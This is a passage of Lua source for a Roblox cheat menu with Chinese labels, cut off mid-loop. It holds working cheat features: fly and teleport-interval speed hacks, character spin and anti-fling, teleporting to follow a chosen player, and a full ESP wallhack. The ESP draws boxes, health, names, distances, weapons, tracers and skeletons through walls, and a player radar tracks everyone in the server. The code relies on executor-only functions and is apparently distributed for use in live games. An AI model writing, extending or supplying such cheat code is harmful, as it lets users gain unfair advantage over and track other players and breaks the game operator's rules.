FlyBox:AddSlider("Fly_Speed",{Text="飞行速度",Min=1,Max=500,Default=50,Rounding=0}):OnChanged(function(value)
flySpeed=value
end)
__XJW_PACE()
FlyBox:AddSlider("Fly_TPInterval",{Text="瞬移间隔",Min=0.05,Max=0.5,Default=0.1,Rounding=2}):OnChanged(function(value)
flyTPInterval=value
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
character:WaitForChild("HumanoidRootPart")
flyLastPos=nil
end)
end
__XJW_GB("旋转")
local SpinBox=Tabs.Main:AddRightGroupbox("旋转","rotate-cw")
local spinRunning=false
local spinSpeed=10
__XJW_PACE()
SpinBox:AddInput("Spin_Speed",{Text="旋转速度",Default="10",Numeric=true}):OnChanged(function(text)
spinSpeed=tonumber(text)or 10
end)
__XJW_PACE()
SpinBox:AddToggle("Spin_Enabled",{Text="旋转开关",Default=false}):OnChanged(function(state)
if state then
spinRunning=true
task.spawn(function()
local player=game.Players.LocalPlayer
while spinRunning do
task.wait()
local character=player.Character
if character then
local humanoidRootPart=character:FindFirstChild("HumanoidRootPart")
if humanoidRootPart then
humanoidRootPart.CFrame=humanoidRootPart.CFrame*CFrame.Angles(0,math.rad(spinSpeed),0)
end
end
end
end)
else
spinRunning=false
end
end)
local antiflingRunning=false
__XJW_PACE()
MiscBox:AddToggle("Antifling_Enabled",{Text="防甩飞",Default=false}):OnChanged(function(state)
if state then
antiflingRunning=true
task.spawn(function()
local Players=game:GetService("Players")
local localPlayer=Players.LocalPlayer
while antiflingRunning do
task.wait(0.3)
for _,player in ipairs(Players:GetPlayers())do
if player~=localPlayer and player.Character then
for _,part in ipairs(player.Character:GetDescendants())do
if part:IsA("BasePart")then
part.CanCollide=false
end
end
end
end
end
end)
else
antiflingRunning=false
local Players=game:GetService("Players")
for _,player in ipairs(Players:GetPlayers())do
if player.Character then
for _,part in ipairs(player.Character:GetDescendants())do
if part:IsA("BasePart")then
part.CanCollide=true
end
end
end
end
end
end)
__XJW_GB("跟随功能")
local FollowBox=Tabs.TP:AddRightGroupbox("跟随功能","footprints")
local followTarget=nil
local followForward=5
local followSide=0
local followHeight=0
local followEnabled=false
local followRunning=false
local followDropdown=FollowBox:AddDropdown("Follow_Target",{
Text="选择跟随目标",
Values={},
Default="",
Multi=false,
})
followDropdown:OnChanged(function(value)
followTarget=value
end)
__XJW_PACE()
FollowBox:AddButton("刷新玩家列表",function()
local names={}
for _,player in ipairs(game.Players:GetPlayers())do
if player~=game.Players.LocalPlayer then
table.insert(names,player.Name)
end
end
followDropdown:SetValues(names)
end)
__XJW_PACE()
FollowBox:AddSlider("Follow_Forward",{Text="前后距离",Default=5,Min=-20,Max=20,Rounding=0}):OnChanged(function(v)
followForward=v
end)
__XJW_PACE()
FollowBox:AddSlider("Follow_Side",{Text="左右距离",Default=0,Min=-20,Max=20,Rounding=0}):OnChanged(function(v)
followSide=v
end)
__XJW_PACE()
FollowBox:AddSlider("Follow_Height",{Text="上下高度",Default=0,Min=-20,Max=20,Rounding=0}):OnChanged(function(v)
followHeight=v
end)
__XJW_PACE()
FollowBox:AddToggle("Follow_Enabled",{Text="跟随玩家",Default=false}):OnChanged(function(state)
followEnabled=state
if state then
followRunning=true
task.spawn(function()
local player=game.Players.LocalPlayer
local runService=game:GetService("RunService")
while followEnabled and followRunning do
if not followTarget then
task.wait(0.1)
else
local target=game.Players:FindFirstChild(followTarget)
local myCharacter=player.Character
if not target or not target.Character or not myCharacter then
task.wait(0.1)
else
local targetRoot=target.Character:FindFirstChild("HumanoidRootPart")
local myRoot=myCharacter:FindFirstChild("HumanoidRootPart")
if not targetRoot or not myRoot then
task.wait(0.1)
else
local newPosition=targetRoot.CFrame.Position
+(targetRoot.CFrame.LookVector*-followForward)
+(targetRoot.CFrame.RightVector*followSide)
+(Vector3.new(0,followHeight,0))
myRoot.CFrame=CFrame.new(newPosition)*CFrame.Angles(0,targetRoot.CFrame.LookVector.Y,0)
runService.RenderStepped:Wait()
end
end
end
end
end)
else
followRunning=false
end
end)
local joinNotifyEnabled=false
__XJW_PACE()
MiscBox:AddToggle("JoinNotify_Enabled",{Text="玩家进入通知",Default=false}):OnChanged(function(state)
joinNotifyEnabled=state
end)
game.Players.PlayerAdded:Connect(function(player)
if not joinNotifyEnabled then return end
local success,thumbnail=pcall(function()
return game:GetService("Players"):GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
end)
local ScreenGui=Instance.new("ScreenGui")
ScreenGui.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")
local Frame=Instance.new("Frame")
Frame.Parent=ScreenGui
Frame.Size=UDim2.new(0,250,0,50)
Frame.Position=UDim2.new(0.1,-125,0.15,0)
Frame.BackgroundColor3=Color3.fromRGB(40,40,40)
Frame.BorderSizePixel=0
local UICorner=Instance.new("UICorner")
UICorner.CornerRadius=UDim.new(0,10)
UICorner.Parent=Frame
if success then
local Avatar=Instance.new("ImageLabel")
Avatar.Parent=Frame
Avatar.Size=UDim2.new(0,35,0,35)
Avatar.Position=UDim2.new(0,8,0.5,-17)
Avatar.Image=thumbnail
end
local Title=Instance.new("TextLabel")
Title.Parent=Frame
Title.Size=UDim2.new(1,-50,0,20)
Title.Position=UDim2.new(0,50,0,5)
Title.BackgroundTransparency=1
Title.Text="玩家进入"
Title.TextColor3=Color3.fromRGB(255,255,255)
Title.Font=Enum.Font.SourceSansBold
Title.TextSize=14
Title.TextXAlignment=Enum.TextXAlignment.Left
local Content=Instance.new("TextLabel")
Content.Parent=Frame
Content.Size=UDim2.new(1,-50,0,20)
Content.Position=UDim2.new(0,50,0,27)
Content.BackgroundTransparency=1
Content.Text=player.DisplayName.." (@"..player.Name..")"
Content.TextColor3=Color3.fromRGB(180,180,180)
Content.Font=Enum.Font.SourceSans
Content.TextSize=13
Content.TextXAlignment=Enum.TextXAlignment.Left
task.delay(5,function()
ScreenGui:Destroy()
end)
end)
do
__XJW_GB("视角功能")
local CamBox=Tabs.Visual:AddLeftGroupbox("视角功能","camera")
local camFOVEnabled=false
local camFOVValue=70
local camFaceLockOn=false
local camFaceLockConn=nil
local camOriginalMaxZoom=game.Players.LocalPlayer.CameraMaxZoomDistance
__XJW_PACE()
CamBox:AddToggle("Cam_FOV",{Text="广角",Default=false}):OnChanged(function(v)
camFOVEnabled=v
if v then
workspace.CurrentCamera.FieldOfView=camFOVValue
else
workspace.CurrentCamera.FieldOfView=70
end
end)
__XJW_PACE()
CamBox:AddSlider("Cam_FOVVal",{Text="广角值",Min=1,Max=300,Default=70,Rounding=0}):OnChanged(function(v)
camFOVValue=v
if camFOVEnabled then
workspace.CurrentCamera.FieldOfView=v
end
end)
__XJW_PACE()
CamBox:AddToggle("Cam_UnlimitedZoom",{Text="视角无限放大",Default=false}):OnChanged(function(v)
if v then
game.Players.LocalPlayer.CameraMaxZoomDistance=math.huge
else
game.Players.LocalPlayer.CameraMaxZoomDistance=camOriginalMaxZoom or 400
end
end)
__XJW_PACE()
CamBox:AddToggle("Cam_FaceLock",{Text="人物视角锁定",Default=false}):OnChanged(function(v)
camFaceLockOn=v
if camFaceLockConn then
camFaceLockConn:Disconnect()
camFaceLockConn=nil
end
if v and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")then
camFaceLockConn=game:GetService("RunService").RenderStepped:Connect(function()
local hrp=game.Players.LocalPlayer.Character.HumanoidRootPart
local camLook=workspace.CurrentCamera.CFrame.LookVector
hrp.CFrame=CFrame.new(hrp.Position,hrp.Position+Vector3.new(camLook.X,0,camLook.Z))
end)
end
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
character:WaitForChild("HumanoidRootPart")
if camFaceLockOn and not camFaceLockConn then
camFaceLockConn=game:GetService("RunService").RenderStepped:Connect(function()
local hrp=character.HumanoidRootPart
local camLook=workspace.CurrentCamera.CFrame.LookVector
hrp.CFrame=CFrame.new(hrp.Position,hrp.Position+Vector3.new(camLook.X,0,camLook.Z))
end)
end
end)
end
pcall(function()
__XJW_GB("ESP设置")
local BSESPBox=Tabs.Visual:AddLeftGroupbox("ESP设置","scan")
getgenv().BSESPConfig=getgenv().BSESPConfig or{
ESPEnabled=false,
ShowBox=false,
Show3DBox=false,
ShowHealth=false,
ShowName=false,
ShowDistance=false,
ShowTracer=false,
TeamCheck=false,
ShowSkeleton=false,
ShowRadar=false,
ShowPlayerCount=false,
ShowWeapon=false,
RainbowMode=false,
HighlightPlayers=false,
TracerColor=Color3.new(1,0,0),
SkeletonColor=Color3.new(0.2,0.8,1),
BoxColor=Color3.new(1,1,1),
Box3DColor=Color3.new(0,1,1),
HealthBarColor=Color3.new(0,1,0),
HealthTextColor=Color3.new(1,1,1),
NameColor=Color3.new(1,1,1),
DistanceColor=Color3.new(1,1,0),
WeaponColor=Color3.new(1,0.5,0),
ArrowColor=Color3.new(1,0,0),
FOVColor=Color3.new(1,1,1),
HighlightColor=Color3.new(1,0,0),
BoxThickness=1,
TracerThickness=1,
SkeletonThickness=2,
FOVRadius=100,
ArrowSize=15,
MaxDistance=math.huge,
ForceStreaming=false,
}
__XJW_LBL("构建:趣味功能-ESP初始化")
local BSPlayers=game:GetService("Players")
local BSRunService=game:GetService("RunService")
local BSCamera=workspace.CurrentCamera
local BSLocalPlayer=BSPlayers.LocalPlayer
local BSESPComponents={}
local BSHighlightInstances={}
local BSRadarDrawings={}
local function getBSRainbowColor(time)
local r=math.sin(time*2)*0.5+0.5
local g=math.sin(time*3)*0.5+0.5
local b=math.sin(time*4)*0.5+0.5
return Color3.new(r,g,b)
end
local function getBSCurrentColor(fixedColor)
if getgenv().BSESPConfig.RainbowMode then
return getBSRainbowColor(tick())
end
return fixedColor
end
local function initBSRadar()
local radarFrame=Drawing.new("Square")
radarFrame.Visible=false
radarFrame.Color=Color3.new(0,0,0)
radarFrame.Thickness=2
radarFrame.Filled=true
radarFrame.Transparency=0.5
radarFrame.Size=Vector2.new(200,200)
local radarBorder=Drawing.new("Square")
radarBorder.Visible=false
radarBorder.Color=Color3.new(1,1,1)
radarBorder.Thickness=2
radarBorder.Filled=false
radarBorder.Size=Vector2.new(200,200)
local radarCrosshairV=Drawing.new("Line")
radarCrosshairV.Visible=false
radarCrosshairV.Color=Color3.new(0.5,0.5,0.5)
radarCrosshairV.Thickness=1
local radarCrosshairH=Drawing.new("Line")
radarCrosshairH.Visible=false
radarCrosshairH.Color=Color3.new(0.5,0.5,0.5)
radarCrosshairH.Thickness=1
local localPlayerDot=Drawing.new("Circle")
localPlayerDot.Visible=false
localPlayerDot.Color=Color3.new(0,1,0)
localPlayerDot.Radius=4
localPlayerDot.Filled=true
BSRadarDrawings={
frame=radarFrame,
border=radarBorder,
crosshairV=radarCrosshairV,
crosshairH=radarCrosshairH,
localPlayer=localPlayerDot,
players={}
}
end
pcall(function()initBSRadar()end)
local BSplayerCountText
pcall(function()BSplayerCountText=Drawing.new("Text")end)
if BSplayerCountText then
BSplayerCountText.Visible=false
BSplayerCountText.Size=20
BSplayerCountText.Font=Drawing.Fonts.Monospace
BSplayerCountText.Outline=true
BSplayerCountText.OutlineColor=Color3.new(0,0,0)
end
local BSfovCircle
pcall(function()
BSfovCircle=Drawing.new("Circle")
BSfovCircle.Thickness=2
BSfovCircle.Filled=false
BSfovCircle.NumSides=64
end)
local function updateBSRadar()
if not getgenv().BSESPConfig.ShowRadar or not getgenv().BSESPConfig.ESPEnabled then
for _,drawing in pairs(BSRadarDrawings)do
if typeof(drawing)=="table"and drawing.Visible~=nil then
drawing.Visible=false
elseif typeof(drawing)=="table"then
for _,d in pairs(drawing)do
if d.Visible~=nil then d.Visible=false end
end
end
end
return
end
local radarRadius=100
local radarPos=Vector2.new(BSCamera.ViewportSize.X-220,20)
local center=radarPos+Vector2.new(radarRadius,radarRadius)
BSRadarDrawings.frame.Position=radarPos
BSRadarDrawings.frame.Visible=true
BSRadarDrawings.border.Position=radarPos
BSRadarDrawings.border.Visible=true
if getgenv().BSESPConfig.RainbowMode then
local rainbow=getBSRainbowColor(tick())
BSRadarDrawings.frame.Color=rainbow
BSRadarDrawings.border.Color=rainbow
end
BSRadarDrawings.crosshairV.From=Vector2.new(center.X,radarPos.Y)
BSRadarDrawings.crosshairV.To=Vector2.new(center.X,radarPos.Y+200)
BSRadarDrawings.crosshairV.Visible=true
BSRadarDrawings.crosshairH.From=Vector2.new(radarPos.X,center.Y)
BSRadarDrawings.crosshairH.To=Vector2.new(radarPos.X+200,center.Y)
BSRadarDrawings.crosshairH.Visible=true
BSRadarDrawings.localPlayer.Position=center
BSRadarDrawings.localPlayer.Visible=true
if getgenv().BSESPConfig.RainbowMode then
BSRadarDrawings.localPlayer.Color=getBSRainbowColor(tick())
end
for player,dot in pairs(BSRadarDrawings.players)do
if player.Parent~=BSPlayers or player==BSLocalPlayer then
dot:Remove()
BSRadarDrawings.players[player]=nil
end
end
if BSLocalPlayer.Character and BSLocalPlayer.Character:FindFirstChild("HumanoidRootPart")then
local localPos=BSLocalPlayer.Character.HumanoidRootPart.Position
local localRot=BSLocalPlayer.Character.HumanoidRootPart.CFrame.LookVector
local localAngle=math.atan2(localRot.X,localRot.Z)
for _,player in pairs(BSPlayers:GetPlayers())do
if player~=BSLocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart")then
local targetPos=player.Character.HumanoidRootPart.Position
local relativePos=targetPos-localPos
local rotatedX=relativePos.X*math.cos(-localAngle)-relativePos.Z*math.sin(-localAngle)
local rotatedZ=relativePos.X*math.sin(-localAngle)+relativePos.Z*math.cos(-localAngle)
local radarX=rotatedX*0.5
local radarY=-rotatedZ*0.5
local distance=math.sqrt(radarX^2+radarY^2)
local clipped=false
if distance>radarRadius-5 then
local scale=(radarRadius-5)/distance
radarX=radarX*scale
radarY=radarY*scale
clipped=true
end
if not BSRadarDrawings.players[player]then
local dot=Drawing.new("Circle")
dot.Radius=clipped and 2 or 3
dot.Filled=true
dot.Thickness=1
BSRadarDrawings.players[player]=dot
end
local dot=BSRadarDrawings.players[player]
dot.Position=center+Vector2.new(radarX,radarY)
dot.Visible=true
if getgenv().BSESPConfig.TeamCheck and player.Team==BSLocalPlayer.Team then
dot.Color=Color3.new(0,1,0)
dot.Radius=3
else
dot.Color=getBSCurrentColor(Color3.new(1,0,0))
dot.Radius=clipped and 2 or 3
end
elseif BSRadarDrawings.players[player]then
BSRadarDrawings.players[player].Visible=false
end
end
end
end
local function updateBSHighlights()
for player,highlight in pairs(BSHighlightInstances)do
if player.Parent~=BSPlayers then
highlight:Destroy()
BSHighlightInstances[player]=nil
end
end
if not getgenv().BSESPConfig.HighlightPlayers or not getgenv().BSESPConfig.ESPEnabled then
for _,highlight in pairs(BSHighlightInstances)do
highlight:Destroy()
end
BSHighlightInstances={}
return
end
for _,player in pairs(BSPlayers:GetPlayers())do
if player~=BSLocalPlayer and player.Character then
local shouldShow=true
if getgenv().BSESPConfig.TeamCheck and player.Team==BSLocalPlayer.Team then
shouldShow=false
end
if shouldShow then
if not BSHighlightInstances[player]then
local highlight=Instance.new("Highlight")
highlight.FillTransparency=0.3
highlight.OutlineTransparency=0
highlight.Parent=player.Character
BSHighlightInstances[player]=highlight
end
local highlight=BSHighlightInstances[player]
local color=getBSCurrentColor(getgenv().BSESPConfig.HighlightColor)
if highlight.FillColor~=color then
highlight.FillColor=color
highlight.OutlineColor=color
end
if highlight.Parent~=player.Character then
highlight.Parent=player.Character
end
elseif BSHighlightInstances[player]then
BSHighlightInstances[player]:Destroy()
BSHighlightInstances[player]=nil
end
end
end
end
local function updateBSGlobalDrawings()
if getgenv().BSESPConfig.ESPEnabled and getgenv().BSESPConfig.ShowPlayerCount then
BSplayerCountText.Text="在线玩家: "..#BSPlayers:GetPlayers()
BSplayerCountText.Position=Vector2.new(BSCamera.ViewportSize.X/2,10)
BSplayerCountText.Visible=true
BSplayerCountText.Color=getBSCurrentColor(Color3.new(1,1,1))
else
BSplayerCountText.Visible=false
end
if getgenv().BSESPConfig.ESPEnabled and getgenv().BSESPConfig.ShowFOV then
BSfovCircle.Radius=getgenv().BSESPConfig.FOVRadius
BSfovCircle.Position=Vector2.new(BSCamera.ViewportSize.X/2,BSCamera.ViewportSize.Y/2)
BSfovCircle.Visible=true
BSfovCircle.Color=getBSCurrentColor(getgenv().BSESPConfig.FOVColor)
else
BSfovCircle.Visible=false
end
end
local function BSEdgePoint(sp,vs)
local w,h=vs.X,vs.Y
local cx,cy=w/2,h/2
local dx,dy=sp.X-cx,sp.Y-cy
if sp.Z<0 then
dx,dy=-dx,-dy
end
local s=math.huge
local halfX=w/2-1
local halfY=h/2-1
if math.abs(dx)>0.0001 then
s=math.min(s,math.abs(halfX/dx))
end
if math.abs(dy)>0.0001 then
s=math.min(s,math.abs(halfY/dy))
end
if s==math.huge then s=1 end
return Vector2.new(cx+dx*s,cy+dy*s)
end
local function updateBSEntity(player)
local comps=BSESPComponents[player]
if not comps then return end
local box=comps.box
local box3D=comps.box3D
local healthBar=comps.healthBar
local healthBarBackground=comps.healthBarBackground
local healthText=comps.healthText
local nameText=comps.nameText
local distanceText=comps.distanceText
local weaponText=comps.weaponText
local tracer=comps.tracer
local arrow=comps.arrow
local skeletonLines=comps.skeletonLines
local smoothHealth=comps.smoothHealth
if not getgenv().BSESPConfig.ESPEnabled or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart")or not player.Character:FindFirstChild("Humanoid")or player==BSLocalPlayer then
box.Visible=false
for i=1,12 do box3D[i].Visible=false end
healthBar.Visible=false
healthBarBackground.Visible=false
healthText.Visible=false
nameText.Visible=false
distanceText.Visible=false
weaponText.Visible=false
tracer.Visible=false
arrow.Visible=false
for _,line in pairs(skeletonLines)do line.Visible=false end
return
end
if getgenv().BSESPConfig.TeamCheck and player.Team==BSLocalPlayer.Team then
box.Visible=false
for i=1,12 do box3D[i].Visible=false end
healthBar.Visible=false
healthBarBackground.Visible=false
healthText.Visible=false
nameText.Visible=false
distanceText.Visible=false
weaponText.Visible=false
tracer.Visible=false
arrow.Visible=false
for _,line in pairs(skeletonLines)do line.Visible=false end
return
end
local character=player.Character
local rootPart=character:FindFirstChild("HumanoidRootPart")
local humanoid=character:FindFirstChild("Humanoid")
if rootPart and humanoid and humanoid.Health>0 then
local rootPos,onScreen=BSCamera:WorldToViewportPoint(rootPart.Position)
local headPos=BSCamera:WorldToViewportPoint(rootPart.Position+Vector3.new(0,3,0))
local legPos=BSCamera:WorldToViewportPoint(rootPart.Position-Vector3.new(0,3,0))
local weaponName="无武器"
for _,tool in ipairs(character:GetChildren())do
if tool:IsA("Tool")then weaponName=tool.Name break end
end
if getgenv().BSESPConfig.ShowBox and onScreen then
box.Size=Vector2.new(1000/rootPos.Z,headPos.Y-legPos.Y)
box.Position=Vector2.new(rootPos.X-box.Size.X/2,rootPos.Y-box.Size.Y/2)
box.Visible=true
box.Color=getBSCurrentColor(getgenv().BSESPConfig.BoxColor)
box.Thickness=getgenv().BSESPConfig.BoxThickness
else
box.Visible=false
end
if getgenv().BSESPConfig.Show3DBox then
local size=Vector3.new(4,6,2)
local cf=rootPart.CFrame
local corners={
cf*CFrame.new(-size.X/2,-size.Y/2,-size.Z/2),
cf*CFrame.new(size.X/2,-size.Y/2,-size.Z/2),
cf*CFrame.new(size.X/2,size.Y/2,-size.Z/2),
cf*CFrame.new(-size.X/2,size.Y/2,-size.Z/2),
cf*CFrame.new(-size.X/2,-size.Y/2,size.Z/2),
cf*CFrame.new(size.X/2,-size.Y/2,size.Z/2),
cf*CFrame.new(size.X/2,size.Y/2,size.Z/2),
cf*CFrame.new(-size.X/2,size.Y/2,size.Z/2)
}
local screenCorners={}
local allOnScreen=true
for i,corner in ipairs(corners)do
local pos,visible=BSCamera:WorldToViewportPoint(corner.Position)
screenCorners[i]=Vector2.new(pos.X,pos.Y)
if not visible then allOnScreen=false end
end
local color=getBSCurrentColor(getgenv().BSESPConfig.Box3DColor)
local lines={{1,2},{2,3},{3,4},{4,1},{5,6},{6,7},{7,8},{8,5},{1,5},{2,6},{3,7},{4,8}}
for i,line in ipairs(lines)do
box3D[i].From=screenCorners[line[1]]
box3D[i].To=screenCorners[line[2]]
box3D[i].Color=color
box3D[i].Thickness=getgenv().BSESPConfig.BoxThickness
box3D[i].Visible=true
end
else
for i=1,12 do box3D[i].Visible=false end
end
if getgenv().BSESPConfig.ShowHealth and onScreen then
local barWidth=50
local barHeight=5
local barX=headPos.X-barWidth/2
local barY=headPos.Y-20
healthBarBackground.Size=Vector2.new(barWidth,barHeight)
healthBarBackground.Position=Vector2.new(barX,barY)
healthBarBackground.Visible=true
smoothHealth=smoothHealth+(humanoid.Health-smoothHealth)*0.1
local smoothHealthPercentage=smoothHealth/humanoid.MaxHealth
healthBar.Size=Vector2.new(barWidth*smoothHealthPercentage,barHeight)
healthBar.Position=Vector2.new(barX,barY)
if smoothHealthPercentage>=0.8 then
healthBar.Color=Color3.new(0,1,0)
elseif smoothHealthPercentage>=0.5 then
healthBar.Color=Color3.new(1,1,0)
elseif smoothHealthPercentage>=0.2 then
healthBar.Color=Color3.new(1,0.5,0)
else
healthBar.Color=Color3.new(1,0,0)
end
healthBar.Visible=true
healthText.Position=Vector2.new(barX+barWidth+5,barY-5)
healthText.Text=math.floor(humanoid.Health).."/"..math.floor(humanoid.MaxHealth)
healthText.Visible=true
healthText.Color=getBSCurrentColor(getgenv().BSESPConfig.HealthTextColor)
else
healthBar.Visible=false
healthBarBackground.Visible=false
healthText.Visible=false
end
if getgenv().BSESPConfig.ShowName and onScreen then
nameText.Position=Vector2.new(headPos.X,headPos.Y-35)
nameText.Text=player.Name
nameText.Visible=true
nameText.Color=getBSCurrentColor(getgenv().BSESPConfig.NameColor)
if getgenv().BSESPConfig.ShowDistance then
local distance=(BSLocalPlayer.Character.HumanoidRootPart.Position-rootPart.Position).Magnitude
distanceText.Position=Vector2.new(headPos.X,headPos.Y+10)
distanceText.Text=math.floor(distance).."m"
distanceText.Visible=true
distanceText.Color=getBSCurrentColor(getgenv().BSESPConfig.DistanceColor)
else
distanceText.Visible=false
end
if getgenv().BSESPConfig.ShowWeapon then
weaponText.Position=Vector2.new(headPos.X,headPos.Y-50)
weaponText.Text=weaponName
weaponText.Visible=true
weaponText.Color=getBSCurrentColor(getgenv().BSESPConfig.WeaponColor)
else
weaponText.Visible=false
end
else
nameText.Visible=false
distanceText.Visible=false
weaponText.Visible=false
end
if getgenv().BSESPConfig.ShowTracer then
local head=character:FindFirstChild("Head")or character:FindFirstChild("HumanoidRootPart")
if head then
local hPos=BSCamera:WorldToViewportPoint(head.Position)
local vs=BSCamera.ViewportSize
tracer.From=Vector2.new(vs.X/2,0)
if hPos.Z>0 then
tracer.To=Vector2.new(hPos.X,hPos.Y)
else
tracer.To=BSEdgePoint(hPos,vs)
end
tracer.Visible=true
tracer.Color=getBSCurrentColor(getgenv().BSESPConfig.TracerColor)
tracer.Thickness=getgenv().BSESPConfig.TracerThickness
else
tracer.Visible=false
end
else
tracer.Visible=false
end
if getgenv().BSESPConfig.OutOfViewArrows and not onScreen then
local direction=(rootPart.Position-BSCamera.CFrame.Position).Unit
local dotProduct=BSCamera.CFrame.RightVector:Dot(direction)
local crossProduct=BSCamera.CFrame.RightVector:Cross(direction)
local screenPosition=Vector2.new(
BSCamera.ViewportSize.X/2+dotProduct*BSCamera.ViewportSize.X/3,
BSCamera.ViewportSize.Y/2-crossProduct.Y*BSCamera.ViewportSize.Y/3
)
screenPosition=Vector2.new(
math.clamp(screenPosition.X,getgenv().BSESPConfig.ArrowSize,BSCamera.ViewportSize.X-getgenv().BSESPConfig.ArrowSize),
math.clamp(screenPosition.Y,getgenv().BSESPConfig.ArrowSize,BSCamera.ViewportSize.Y-getgenv().BSESPConfig.ArrowSize)
)
local angle=math.atan2(screenPosition.Y-BSCamera.ViewportSize.Y/2,screenPosition.X-BSCamera.ViewportSize.X/2)
arrow.PointA=screenPosition
arrow.PointB=Vector2.new(screenPosition.X-getgenv().BSESPConfig.ArrowSize*math.cos(angle-0.5),screenPosition.Y-getgenv().BSESPConfig.ArrowSize*math.sin(angle-0.5))
arrow.PointC=Vector2.new(screenPosition.X-getgenv().BSESPConfig.ArrowSize*math.cos(angle+0.5),screenPosition.Y-getgenv().BSESPConfig.ArrowSize*math.sin(angle+0.5))
arrow.Color=getBSCurrentColor(getgenv().BSESPConfig.ArrowColor)
arrow.Visible=true
else
arrow.Visible=false
end
if getgenv().BSESPConfig.ShowSkeleton and onScreen then
local head=character:FindFirstChild("Head")
local torso=character:FindFirstChild("Torso")or character:FindFirstChild("UpperTorso")
local leftArm=character:FindFirstChild("Left Arm")or character:FindFirstChild("LeftUpperArm")
local rightArm=character:FindFirstChild("Right Arm")or character:FindFirstChild("RightUpperArm")
local leftLeg=character:FindFirstChild("Left Leg")or character:FindFirstChild("LeftUpperLeg")
local rightLeg=character:FindFirstChild("Right Leg")or character:FindFirstChild("RightUpperLeg")
local skeletonColor=getBSCurrentColor(getgenv().BSESPConfig.SkeletonColor)
if head and torso and leftArm and rightArm and leftLeg and rightLeg then
local connections={
{head,torso},{torso,leftArm},{torso,rightArm},
{torso,leftLeg},{torso,rightLeg}
}
for i,conn in ipairs(connections)do
local pos1=BSCamera:WorldToViewportPoint(conn[1].Position)
local pos2=BSCamera:WorldToViewportPoint(conn[2].Position)
skeletonLines[i].From=Vector2.new(pos1.X,pos1.Y)
skeletonLines[i].To=Vector2.new(pos2.X,pos2.Y)
skeletonLines[i].Color=skeletonColor
skeletonLines[i].Visible=true
end
for i=#connections+1,15 do
skeletonLines[i].Visible=false
end
else
for _,line in pairs(skeletonLines)do line.Visible=false end
end
else
for _,line in pairs(skeletonLines)do line.Visible=false end
end
end
comps.smoothHealth=smoothHealth
end
local function createBSESP(player)
local box
if not Drawing then return end
box=Drawing.new("Square")
box.Visible=false
box.Color=getgenv().BSESPConfig.BoxColor
box.Thickness=getgenv().BSESPConfig.BoxThickness
box.Filled=false
local box3D={}
for i=1,12 do
box3D[i]=Drawing.new("Line")
box3D[i].Visible=false
box3D[i].Thickness=getgenv().BSESPConfig.BoxThickness
end
local healthBar=Drawing.new("Square")
healthBar.Visible=false
healthBar.Filled=true
local healthBarBackground=Drawing.new("Square")
healthBarBackground.Visible=false
healthBarBackground.Color=Color3.new(0,0,0)
healthBarBackground.Transparency=0.5
healthBarBackground.Filled=true
local healthText=Drawing.new("Text")
healthText.Visible=false
healthText.Color=getgenv().BSESPConfig.HealthTextColor
healthText.Size=14
healthText.Font=Drawing.Fonts.Monospace
healthText.Outline=true
healthText.OutlineColor=Color3.new(0,0,0)
local nameText=Drawing.new("Text")
nameText.Visible=false
nameText.Size=16
nameText.Font=Drawing.Fonts.Monospace
nameText.Outline=true
nameText.OutlineColor=Color3.new(0,0,0)
local distanceText=Drawing.new("Text")
distanceText.Visible=false
distanceText.Size=14
distanceText.Font=Drawing.Fonts.Monospace
distanceText.Outline=true
distanceText.OutlineColor=Color3.new(0,0,0)
local weaponText=Drawing.new("Text")
weaponText.Visible=false
weaponText.Size=14
weaponText.Font=Drawing.Fonts.Monospace
weaponText.Outline=true
weaponText.OutlineColor=Color3.new(0,0,0)
local tracer=Drawing.new("Line")
tracer.Visible=false
tracer.Color=getgenv().BSESPConfig.TracerColor
tracer.Thickness=getgenv().BSESPConfig.TracerThickness
local arrow=Drawing.new("Triangle")
arrow.Visible=false
arrow.Filled=true
arrow.Thickness=1
local skeletonLines={}
for i=1,15 do
skeletonLines[i]=Drawing.new("Line")
skeletonLines[i].Visible=false
skeletonLines[i].Color=getgenv().BSESPConfig.SkeletonColor
skeletonLines[i].Thickness=getgenv().BSESPConfig.SkeletonThickness
end
BSESPComponents[player]={
box=box,box3D=box3D,healthBar=healthBar,
healthBarBackground=healthBarBackground,healthText=healthText,
nameText=nameText,distanceText=distanceText,weaponText=weaponText,
tracer=tracer,arrow=arrow,skeletonLines=skeletonLines,
smoothHealth=100,
}
end
local bsRenderOn=false
BSPlayers.PlayerAdded:Connect(function(player)
if bsRenderOn then
pcall(createBSESP,player)
end
end)
local function rmDrawingObj(v)
if v==nil or type(v)=="number"or type(v)=="string"or type(v)=="boolean"then return end
local ok=pcall(function()v:Remove()end)
if not ok and type(v)=="table" then
pcall(function()
for _,d in pairs(v)do
rmDrawingObj(d)
end
end)
end
end
local function removeBSESP(player)
local comps=BSESPComponents[player]
if not comps then return end
BSESPComponents[player]=nil
pcall(function()
for _,v in pairs(comps)do
rmDrawingObj(v)
end
end)
end
BSPlayers.PlayerRemoving:Connect(removeBSESP)
local BSRenderConn
local function XJW_BSCleanup()
if BSRenderConn then
pcall(function()BSRenderConn:Disconnect()end)
BSRenderConn=nil
end
for player in pairs(BSESPComponents)do
removeBSESP(player)
end
for player,highlight in pairs(BSHighlightInstances)do
pcall(function()highlight:Destroy()end)
BSHighlightInstances[player]=nil
end
for k,v in pairs(BSRadarDrawings)do
rmDrawingObj(v)
BSRadarDrawings[k]=nil
end
pcall(function()
if BSfovCircle then
BSfovCircle:Remove()
BSfovCircle=nil
end
end)
pcall(function()
if BSplayerCountText then
BSplayerCountText:Remove()
BSplayerCountText=nil
end
end)
end
if type(getgenv)=="function"then
getgenv().XJW_BSCleanup=XJW_BSCleanup
end
local function BSForceStreamAll()
if not getgenv().BSESPConfig.ForceStreaming then return end
if not workspace.StreamingEnabled then return end
for _,pl in ipairs(BSPlayers:GetPlayers())do
if pl~=BSLocalPlayer then
local ch=pl.Character
local rp=ch and(ch:FindFirstChild("HumanoidRootPart")or ch:FindFirstChildWhichIsA("BasePart"))
if rp then
pcall(function()BSLocalPlayer:RequestStreamAroundAsync(rp.Position)end)
end
end
end
end
task.spawn(function()
while true do
